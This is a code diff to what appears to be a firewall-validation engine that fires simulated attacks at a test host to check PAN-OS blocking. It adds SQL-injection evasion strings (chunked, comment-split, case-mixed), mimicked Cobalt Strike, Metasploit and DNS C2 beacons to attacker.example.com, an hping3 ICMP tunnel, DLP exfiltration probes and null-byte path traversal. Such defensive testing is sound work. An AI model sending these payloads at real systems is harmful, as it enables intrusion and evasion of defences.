+    'evasion_case_mixing': "' uNiOn SeLeCt username,password FrOm users--",
+    'evasion_comment_insert': "' UN/**/ION SEL/**/ECT username,password FR/**/OM users--",
+    # Expanded C2
+    'c2_cobalt_strike': '/submit.php?id=1234567890',
+    'c2_metasploit': '/4hRs',
+    'c2_dns_c2': 'Y21kPXdob2FtaQ.c2.attacker.example.com|aWQ9YWRtaW4.beacon.attacker.example.com|c3RhdHVzPWFsaXZl.check.attacker.example.com',
+    'c2_icmp_tunnel': 'ICMP-TUNNEL-DATA:Y21kPXdob2FtaSAmJiBob3N0bmFtZSAmJiBpZA==',
+    'c2_http_beacon': 'eyJiZWFjb24iOiJ0cnVlIiwic2xlZXAiOjYwLCJqaXR0ZXIiOjEwfQ==',
 }
 
 # ─── Custom Pattern Store ──────────────────────────────────
@@ -431,6 +586,8 @@ def _resp_headers(resp) -> dict:
 class SecurityTestEngine:
     def __init__(self, custom_store: Optional[CustomPatternStore] = None):
         self._results: Dict[str, SecurityTestResult] = {}
+        self._baseline_results: Dict[str, SecurityTestResult] = {}
+        self._current_mode: str = 'enforcement'
         self._running = False
         self._thread: Optional[threading.Thread] = None
         self._stop_event = threading.Event()
@@ -515,8 +672,8 @@ class SecurityTestEngine:
             groups[t.category].append({
                 'id': t.id, 'name': t.name, 'category': t.category,
                 'description': t.description, 'expected_action': t.expected_action,
-                'panos_feature': t.panos_feature, 'custom': t.custom,
-                'editable': True,
+                'panos_feature': t.panos_feature, 'threat_id': t.threat_id,
+                'custom': t.custom, 'editable': True,
                 'overridden': t.id in overridden_ids,
                 'builtin': is_builtin and not t.custom,
                 'payload': ATTACK_PAYLOADS.get(t.id, t.payload if t.custom else ''),
@@ -543,6 +700,7 @@ class SecurityTestEngine:
         http_port = int(config.get('http_port', 9999))
         https_port = int(config.get('https_port', 443))
         interval = float(config.get('interval', 2))
+        self._current_mode = config.get('mode', 'enforcement')
 
         # Mark selected tests as pending
         with self._lock:
@@ -551,8 +709,8 @@ class SecurityTestEngine:
                     test_id=t.id, test_name=t.name, category=t.category,
                     expected_action=t.expected_action, actual_result='pending',
                     verdict='PENDING', response_code=0, detail='Queued',
-                    panos_feature=t.panos_feature, timestamp=time.time(),
-                    description=t.description)
+                    panos_feature=t.panos_feature, threat_id=t.threat_id,
+                    timestamp=time.time(), description=t.description)
 
         self._stop_event.clear()
         self._running = True
@@ -574,6 +732,7 @@ class SecurityTestEngine:
     def clear(self):
         with self._lock:
             self._results.clear()
+            self._baseline_results.clear()
             self._logs.clear()
 
     def get_status(self) -> dict:
@@ -585,7 +744,8 @@ class SecurityTestEngine:
                     'category': r.category, 'expected_action': r.expected_action,
                     'actual_result': r.actual_result, 'verdict': r.verdict,
                     'response_code': r.response_code, 'detail': r.detail,
-                    'panos_feature': r.panos_feature, 'timestamp': r.timestamp,
+                    'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
+                    'timestamp': r.timestamp,
                     'description': r.description, 'payload': r.payload,
                     'url': r.url, 'method': r.method,
                     'expected_behavior': r.expected_behavior,
@@ -606,6 +766,39 @@ class SecurityTestEngine:
                         'errors': errors, 'pending': pending},
         }
 
+    def get_comparison(self) -> dict:
+        """Return baseline vs enforcement comparison for all tests."""
+        def _result_dict(r):
+            return {
+                'test_id': r.test_id, 'test_name': r.test_name,
+                'category': r.category, 'verdict': r.verdict,
+                'actual_result': r.actual_result,
+                'detail': r.detail, 'response_code': r.response_code,
+                'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
+                'verdict_explanation': r.verdict_explanation,
+            }
+        with self._lock:
+            comparison = {}
+            all_ids = set(list(self._baseline_results.keys()) + list(self._results.keys()))
+            for tid in all_ids:
+                entry = {'test_id': tid}
+                if tid in self._baseline_results:
+                    entry['baseline'] = _result_dict(self._baseline_results[tid])
+                    entry['test_name'] = self._baseline_results[tid].test_name
+                    entry['category'] = self._baseline_results[tid].category
+                if tid in self._results:
+                    entry['enforcement'] = _result_dict(self._results[tid])
+                    entry['test_name'] = self._results[tid].test_name
+                    entry['category'] = self._results[tid].category
+                comparison[tid] = entry
+        return {
+            'comparison': comparison,
+            'has_baseline': len(self._baseline_results) > 0,
+            'has_enforcement': len(self._results) > 0,
+            'baseline_count': len(self._baseline_results),
+            'enforcement_count': len(self._results),
+        }
+
     def _add_log(self, msg: str):
         with self._lock:
             ts = time.strftime('%H:%M:%S')
@@ -616,14 +809,32 @@ class SecurityTestEngine:
 
     def _run_tests(self, tests, host, http_port, https_port, interval):
         """Execute tests sequentially."""
+        is_baseline = self._current_mode == 'baseline'
+        mode_label = 'BASELINE' if is_baseline else 'ENFORCEMENT'
+        self._add_log(f'Mode: {mode_label}')
         for test in tests:
             if self._stop_event.is_set():
                 break
             self._add_log(f'Running: {test.name}')
             try:
                 result = self._execute_test(test, host, http_port, https_port)
-                with self._lock:
-                    self._results[test.id] = result
+                # In baseline mode, invert verdicts and store separately
+                if is_baseline:
+                    if result.actual_result == 'passed_through':
+                        result.verdict = 'PASS'
+                        result.verdict_explanation = (
+                            'BASELINE PASS — Attack passed through as expected (no security profiles). '
+                            'This confirms connectivity to the server is working.')
+                    elif result.actual_result == 'blocked':
+                        result.verdict = 'FAIL'
+                        result.verdict_explanation = (
+                            'BASELINE FAIL — Attack was blocked even without security profiles enabled. '
+                            'Check if security profiles are still attached or another device is blocking.')
+                    with self._lock:
+                        self._baseline_results[test.id] = result
+                else:
+                    with self._lock:
+                        self._results[test.id] = result
                 verdict_msg = f'{test.name} → {result.verdict}'
                 if result.verdict == 'PASS':
                     verdict_msg += ' (blocked by firewall)'
@@ -670,6 +881,14 @@ class SecurityTestEngine:
             return self._test_protocol_abuse(test, host, http_port)
         elif test.category == 'file_threats':
             return self._test_file_threat(test, host, http_port)
+        elif test.category == 'ssl_decryption':
+            return self._test_ssl_decryption(test, host, https_port)
+        elif test.category == 'appid_validation':
+            return self._test_appid_validation(test, host, https_port)
+        elif test.category == 'data_exfiltration':
+            return self._test_data_exfiltration(test, host, http_port)
+        elif test.category == 'evasion_techniques':
+            return self._test_evasion_technique(test, host, http_port)
         else:
             return self._error_result(test, f'Unknown category: {test.category}')
 
@@ -911,6 +1130,121 @@ class SecurityTestEngine:
             except (requests.ConnectionError, requests.Timeout, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'c2_cobalt_strike':
+            import random
+            sid = str(random.randint(1000000000, 9999999999))
+            url = f'http://{host}:{http_port}/submit.php?id={sid}'
+            payload = ATTACK_PAYLOADS.get(test.id, '')
+            try:
+                resp = requests.post(url,
+                    data='eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0In0=',
+                    headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
+                        'Cookie': f'SESSIONID={sid};DM=YWRtaW46cGFzc3dvcmQ=',
+                        'Accept': '*/*',
+                        'Cache-Control': 'no-cache',
+                    }, timeout=10)
+                return self._analyze_response(test, resp, 'beacon',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'c2_metasploit':
+            import random, string
+            uri = '/' + ''.join(random.choices(string.ascii_letters, k=4))
+            url = f'http://{host}:{http_port}{uri}'
+            payload = ATTACK_PAYLOADS.get(test.id, '')
+            pe_body = b'MZ' + b'\x90' * 64 + b'\x00' * 64
+            try:
+                resp = requests.post(url, data=pe_body,
+                    headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
+                        'Content-Type': 'application/octet-stream',
+                        'Connection': 'Keep-Alive',
+                    }, timeout=10)
+                return self._analyze_response(test, resp, 'MZ',
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'c2_dns_c2':
+            payload = ATTACK_PAYLOADS.get(test.id, '')
+            domains = payload.split('|')
+            blocked_count = 0
+            sinkholed_count = 0
+            all_output = []
+            for domain in domains:
+                output, blocked, sinkholed, error = self._dns_query(host, domain, qtype='TXT')
+                all_output.append(f'{domain}: {"BLOCKED" if blocked else "SINKHOLED" if sinkholed else "RESOLVED"}')
+                if blocked:
+                    blocked_count += 1
+                if sinkholed:
+                    sinkholed_count += 1
+            detail_str = '; '.join(all_output)
+            if blocked_count + sinkholed_count >= 2:
+                return self._blocked_result(test,
+                    f'DNS C2 queries intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed): {detail_str}',
+                    url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)
+            return self._passthrough_result(test, 0,
+                f'DNS C2 queries resolved — not intercepted: {detail_str}',
+                url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)
+
+        elif test.id == 'c2_icmp_tunnel':
+            payload = ATTACK_PAYLOADS.get(test.id, '')
+            try:
+                data = b'ICMP-TUNNEL:' + b'A' * 64
+                result = subprocess.run(
+                    ['sudo', 'hping3', '--icmp', '-c', '3', '-d', str(len(data)),
+                     '--data', str(len(data)), host],
+                    capture_output=True, text=True, timeout=15)
+                output = result.stdout + result.stderr
+                if '100% packet loss' in output or result.returncode != 0:
+                    return self._blocked_result(test,
+                        f'ICMP packets dropped/blocked: {output[:200]}',
+                        url=f'ICMP {host}', method='ICMP', sent_payload=payload)
+                return self._passthrough_result(test, 0,
+                    f'ICMP tunnel packets delivered: {output[:200]}',
+                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)
+            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
+                return self._blocked_result(test, f'ICMP blocked or hping3 unavailable: {e}',
+                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)
+
+        elif test.id == 'c2_http_beacon':
+            payload = ATTACK_PAYLOADS.get(test.id, '')
+            url = f'http://{host}:{http_port}/echo'
+            uas = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
+                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)',
+            ]
+            passed = 0
+            blocked = 0
+            for i, ua in enumerate(uas):
+                try:
+                    resp = requests.post(url,
+                        data=f'{{"seq":{i},"beacon":"true","sleep":60}}',
+                        headers={
+                            'User-Agent': ua,
+                            'X-Beacon-Seq': str(i),
+                            'Content-Type': 'application/json',
+                        }, timeout=5)
+                    if self._is_block_page(resp) or resp.status_code in (403, 406, 503):
+                        blocked += 1
+                    else:
+                        passed += 1
+                except (requests.ConnectionError, requests.Timeout, OSError):
+                    blocked += 1
+                time.sleep(0.5)
+            if blocked >= 2:
+                return self._blocked_result(test,
+                    f'HTTP beacon blocked ({blocked}/3 callbacks intercepted)',
+                    url=url, method='POST', sent_payload=payload)
+            return self._passthrough_result(test, 200,
+                f'HTTP beacon passed through ({passed}/3 callbacks succeeded)',
+                url=url, method='POST', sent_payload=payload)
 
         return self._error_result(test, f'Unknown malware test: {test.id}')
 
@@ -1273,6 +1607,323 @@ class SecurityTestEngine:
             return self._blocked_result(test, f'Connection blocked: {e}',
                 url=url, method='GET', sent_payload=payload)
 
+    # ─── SSL Decryption Validation ──────────────────────────
+
+    def _test_ssl_decryption(self, test: SecurityTestCase, host: str,
+                              https_port: int) -> SecurityTestResult:
+        """Test SSL decryption by sending attacks over HTTPS."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'ssl_eicar':
+            url = f'https://{host}:{https_port}/eicar'
+            try:
+                resp = requests.get(url, timeout=10, verify=False)
+                if resp.status_code == 200 and b'EICAR' in resp.content:
+                    return self._passthrough_result(test, resp.status_code,
+                        'EICAR downloaded over HTTPS — SSL Decryption is NOT active or Anti-Virus profile not attached',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._analyze_response(test, resp, 'EICAR',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'ssl_c2':
+            url = f'https://{host}:{https_port}/echo'
+            c2_data = payload
+            try:
+                resp = requests.post(url, data=c2_data,
+                    headers={
+                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
+                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
+                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
+                    }, timeout=10, verify=False)
+                return self._analyze_response(test, resp, c2_data,
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        else:
+            # ssl_sqli, ssl_xss, ssl_cmdi — GET with payload param over HTTPS
+            encoded = quote(payload)
+            url = f'https://{host}:{https_port}/echo?payload={encoded}'
+            try:
+                resp = requests.get(url, timeout=10, verify=False)
+                return self._analyze_response(test, resp, payload,
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+    # ─── App-ID Validation ───────────────────────────────────
+
+    def _test_appid_validation(self, test: SecurityTestCase, host: str,
+                                https_port: int) -> SecurityTestResult:
+        """Test App-ID by sending wrong protocol on standard ports."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'appid_ssh_on_443':
+            url = f'TCP {host}:443'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, 443))
+                s.sendall(b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n')
+                resp_data = s.recv(1024)
+                s.close()
+                resp_str = resp_data.decode('utf-8', errors='replace')
+                if 'SSH' in resp_str:
+                    return self._passthrough_result(test, 0,
+                        f'SSH handshake on port 443 succeeded — App-ID may not be enforcing application policy. Response: {resp_str[:100]}',
+                        url=url, method='TCP', sent_payload=payload)
+                return self._passthrough_result(test, 0,
+                    f'Connection to port 443 succeeded with response: {resp_str[:100]}',
+                    url=url, method='TCP', sent_payload=payload)
+            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
+                return self._blocked_result(test,
+                    f'SSH on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+            except (socket.timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection to port 443 timed out/blocked: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+
+        elif test.id == 'appid_http_on_8080':
+            url = f'http://{host}:8082/'
+            try:
+                resp = requests.get(url, timeout=10,
+                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html'})
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'HTTP on port 8082 identified as web-browsing — App-ID correctly identified application',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._analyze_response(test, resp, '',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        elif test.id == 'appid_ftp_on_443':
+            url = f'TCP {host}:443'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, 443))
+                s.sendall(b'USER anonymous\r\n')
+                resp_data = s.recv(1024)
+                s.close()
+                return self._passthrough_result(test, 0,
+                    f'FTP command on port 443 got response — App-ID may not be enforcing: {resp_data[:100]}',
+                    url=url, method='TCP', sent_payload=payload)
+            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
+                return self._blocked_result(test,
+                    f'FTP on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+            except (socket.timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection timed out/blocked: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+
+        elif test.id == 'appid_dns_on_80':
+            url = f'TCP {host}:80'
+            try:
+                # Build minimal DNS A query for example.com
+                txid = b'\x12\x34'
+                flags = b'\x01\x00'  # standard query, recursion desired
+                qdcount = b'\x00\x01'
+                ancount = b'\x00\x00'
+                nscount = b'\x00\x00'
+                arcount = b'\x00\x00'
+                header = txid + flags + qdcount + ancount + nscount + arcount
+                # example.com as DNS labels
+                qname = b'\x07example\x03com\x00'
+                qtype = b'\x00\x01'   # A record
+                qclass = b'\x00\x01'  # IN
+                query = header + qname + qtype + qclass
+                # DNS over TCP: prepend 2-byte length
+                tcp_dns = struct.pack('!H', len(query)) + query
+
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, 80))
+                s.sendall(tcp_dns)
+                resp_data = s.recv(1024)
+                s.close()
+                return self._passthrough_result(test, 0,
+                    f'DNS query on port 80 got response ({len(resp_data)} bytes) — App-ID may not be enforcing',
+                    url=url, method='TCP', sent_payload=payload)
+            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
+                return self._blocked_result(test,
+                    f'DNS on port 80 blocked — App-ID identified non-HTTP traffic: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+            except (socket.timeout, OSError) as e:
+                return self._blocked_result(test,
+                    f'Connection timed out/blocked: {e}',
+                    url=url, method='TCP', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown App-ID test: {test.id}')
+
+    # ─── Data Exfiltration / DLP ─────────────────────────────
+
+    def _test_data_exfiltration(self, test: SecurityTestCase, host: str,
+                                 http_port: int) -> SecurityTestResult:
+        """Test data exfiltration / DLP detection."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id in ('exfil_credit_card', 'exfil_ssn', 'exfil_bulk_data'):
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={
+                        'Content-Type': 'text/plain',
+                        'X-Data-Export': 'employee-records',
+                    }, timeout=10)
+                return self._analyze_response(test, resp, payload[:20],
+                    url=url, method='POST', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'exfil_dns_data':
+            domains = payload.split('|')
+            blocked_count = 0
+            sinkholed_count = 0
+            all_output = []
+            for domain in domains:
+                output, blocked, sinkholed, error = self._dns_query(host, domain)
+                status = 'BLOCKED' if blocked else 'SINKHOLED' if sinkholed else 'RESOLVED'
+                all_output.append(f'{domain[:30]}...: {status}')
+                if blocked:
+                    blocked_count += 1
+                if sinkholed:
+                    sinkholed_count += 1
+            detail_str = '; '.join(all_output)
+            if blocked_count + sinkholed_count >= 2:
+                return self._blocked_result(test,
+                    f'DNS exfiltration intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed)',
+                    url=f'DNS @{host}', method='DNS', sent_payload=payload)
+            return self._passthrough_result(test, 0,
+                f'DNS exfiltration queries resolved — data leaked: {detail_str}',
+                url=f'DNS @{host}', method='DNS', sent_payload=payload)
+
+        elif test.id == 'exfil_http_headers':
+            parts = payload.split('|')
+            url = f'http://{host}:{http_port}/echo'
+            headers_dict = {
+                'X-Session-Data': parts[0] if len(parts) > 0 else '',
+                'X-Debug-Info': parts[1] if len(parts) > 1 else '',
+                'X-Trace-ID': parts[2] if len(parts) > 2 else '',
+            }
+            try:
+                resp = requests.get(url, headers=headers_dict, timeout=10)
+                return self._analyze_response(test, resp, parts[0][:8] if parts else '',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        return self._error_result(test, f'Unknown exfiltration test: {test.id}')
+
+    # ─── Evasion Techniques ──────────────────────────────────
+
+    def _test_evasion_technique(self, test: SecurityTestCase, host: str,
+                                 http_port: int) -> SecurityTestResult:
+        """Test evasion techniques — encoded/obfuscated attack payloads."""
+        payload = ATTACK_PAYLOADS.get(test.id, '')
+
+        if test.id == 'evasion_chunked':
+            # Raw socket HTTP with chunked transfer encoding
+            url = f'http://{host}:{http_port}/echo'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(10)
+                s.connect((host, http_port))
+                # Split SQL injection across chunks
+                chunks = ["' UNION ", "SELECT user", "name,password ", "FROM users--"]
+                body_parts = []
+                for chunk in chunks:
+                    body_parts.append(f'{len(chunk):x}\r\n{chunk}\r\n')
+                body_parts.append('0\r\n\r\n')
+                chunked_body = ''.join(body_parts)
+                http_req = (
+                    f'POST /echo HTTP/1.1\r\n'
+                    f'Host: {host}:{http_port}\r\n'
+                    f'Transfer-Encoding: chunked\r\n'
+                    f'Content-Type: application/x-www-form-urlencoded\r\n'
+                    f'Connection: close\r\n'
+                    f'\r\n'
+                    f'{chunked_body}'
+                )
+                s.sendall(http_req.encode())
+                resp_data = b''
+                while True:
+                    try:
+                        chunk = s.recv(4096)
+                        if not chunk:
+                            break
+                        resp_data += chunk
+                    except socket.timeout:
+                        break
+                s.close()
+                resp_str = resp_data.decode('utf-8', errors='replace')
+                if 'UNION' in resp_str and 'SELECT' in resp_str:
+                    return self._passthrough_result(test, 200,
+                        'Chunked evasion passed through — firewall did not reassemble chunks',
+                        url=url, method='POST', sent_payload=payload)
+                if any(marker.lower() in resp_str.lower() for marker in BLOCK_PAGE_MARKERS):
+                    return self._blocked_result(test,
+                        'Block page detected — firewall reassembled chunks and detected attack',
+                        url=url, method='POST', sent_payload=payload)
+                if 'HTTP/1.1 403' in resp_str or 'HTTP/1.1 406' in resp_str:
+                    return self._blocked_result(test,
+                        'HTTP 403/406 — chunked attack blocked',
+                        url=url, method='POST', sent_payload=payload)
+                if not resp_data:
+                    return self._blocked_result(test,
+                        'Connection reset — firewall blocked chunked evasion',
+                        url=url, method='POST', sent_payload=payload)
+                return self._passthrough_result(test, 200,
+                    f'Chunked request got response — may not have been inspected: {resp_str[:150]}',
+                    url=url, method='POST', sent_payload=payload)
+            except (ConnectionResetError, BrokenPipeError) as e:
+                return self._blocked_result(test,
+                    f'Connection reset — firewall detected chunked evasion: {e}',
+                    url=url, method='POST', sent_payload=payload)
+            except (socket.timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='POST', sent_payload=payload)
+
+        elif test.id == 'evasion_null_byte':
+            # Path traversal with null byte — send as raw URL path
+            url = f'http://{host}:{http_port}/{payload}'
+            try:
+                resp = requests.get(url, timeout=10)
+                return self._analyze_response(test, resp, 'etc/passwd',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
+        else:
+            # evasion_double_encode, evasion_unicode, evasion_case_mixing, evasion_comment_insert
+            # Send payload as-is in query parameter (don't let requests re-encode)
+            url = f'http://{host}:{http_port}/echo?payload={payload}'
+            try:
+                resp = requests.get(url, timeout=10)
+                # Check for SQL/XSS indicators in response
+                markers = ['UNION', 'SELECT', 'script', 'alert', 'passwd']
+                marker_found = any(m.lower() in (resp.text or '').lower() for m in markers)
+                if marker_found:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Evasion payload echoed back — firewall did not decode/normalize',
+                        resp=resp, url=url, method='GET', sent_payload=payload)
+                return self._analyze_response(test, resp, '',
+                    url=url, method='GET', sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                return self._blocked_result(test, f'Connection blocked: {e}',
+                    url=url, method='GET', sent_payload=payload)
+
     # ─── Built-in Test Overrides ─────────────────────────────
 
     def get_builtin_test(self, test_id: str) -> Optional[dict]:
@@ -1384,9 +2035,10 @@ class SecurityTestEngine:
             test_id=test.id, test_name=test.name, category=test.category,
             expected_action=test.expected_action, actual_result='blocked',
             verdict='PASS', response_code=status_code, detail=detail,
-            panos_feature=test.panos_feature, timestamp=time.time(),
-            description=test.description, payload=sent_payload,
-            url=url, method=method, expected_behavior=expected,
+            panos_feature=test.panos_feature, threat_id=test.threat_id,
+            timestamp=time.time(), description=test.description,
+            payload=sent_payload, url=url, method=method,
+            expected_behavior=expected,
             response_body_snippet=_resp_snippet(resp) if resp else '',
             response_headers=_resp_headers(resp) if resp else {},
             verdict_explanation=explanation)
@@ -1410,9 +2062,10 @@ class SecurityTestEngine:
             test_id=test.id, test_name=test.name, category=test.category,
             expected_action=test.expected_action, actual_result='passed_through',
             verdict='FAIL', response_code=status_code, detail=detail,
-            panos_feature=test.panos_feature, timestamp=time.time(),
-            description=test.description, payload=sent_payload,
-            url=url, method=method, expected_behavior=expected,
+            panos_feature=test.panos_feature, threat_id=test.threat_id,
+            timestamp=time.time(), description=test.description,
+            payload=sent_payload, url=url, method=method,
+            expected_behavior=expected,
             response_body_snippet=_resp_snippet(resp) if resp else '',
             response_headers=_resp_headers(resp) if resp else {},
             verdict_explanation=explanation)
@@ -1423,7 +2076,8 @@ class SecurityTestEngine:
             test_id=test.id, test_name=test.name, category=test.category,
             expected_action=test.expected_action, actual_result='error',
             verdict='ERROR', response_code=0, detail=detail,
-            panos_feature=test.panos_feature, timestamp=time.time(),
-            description=test.description, payload=sent_payload,
-            url=url, method=method, expected_behavior=expected,
+            panos_feature=test.panos_feature, threat_id=test.threat_id,
+            timestamp=time.time(), description=test.description,
+            payload=sent_payload, url=url, method=method,
+            expected_behavior=expected,
             verdict_explanation=f'ERROR — Test could not complete: {detail}')
